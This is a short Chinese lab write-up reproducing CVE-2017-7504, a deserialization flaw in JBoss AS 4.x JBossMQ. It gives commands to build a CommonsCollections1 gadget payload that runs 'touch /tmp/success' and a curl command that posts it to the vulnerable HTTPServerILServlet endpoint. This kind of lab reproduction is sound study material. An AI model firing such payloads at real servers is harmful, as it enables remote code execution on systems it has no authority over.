

# JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）

###### by ADummy

### 0x00利用路线

​			ysoserial生成payload--->上传给网站进行解析--->命令执行

### 0x01漏洞介绍

​			Jboss AS 4.x及之前版本中,JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞,远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。

​			影响版本

  	JBoss AS <=4.x

### 0x02漏洞复现

​	参考利用工具[JavaDeserH2HC](https://github.com/joaomatosf/JavaDeserH2HC)，我们选择一个Gadget：`ExampleCommonsCollections1WithHashMap`，编译并生成序列化数据：

```
javac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap.java
java -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap "touch /tmp/success"
```

可见，我们执行的命令是`touch /tmp/success`。执行完成后，将生成一个文件`ExampleCommonsCollections1WithHashMap.ser`，将该文件作为body发送如下数据包：

```
curl http://your-ip:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ExampleCommonsCollections1WithHashMap.ser
```

jdk1.8执行失败。用linux可以直接执行

![JBoss_7504_反序列化漏洞_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/JBoss_7504_反序列化漏洞_1.jpg)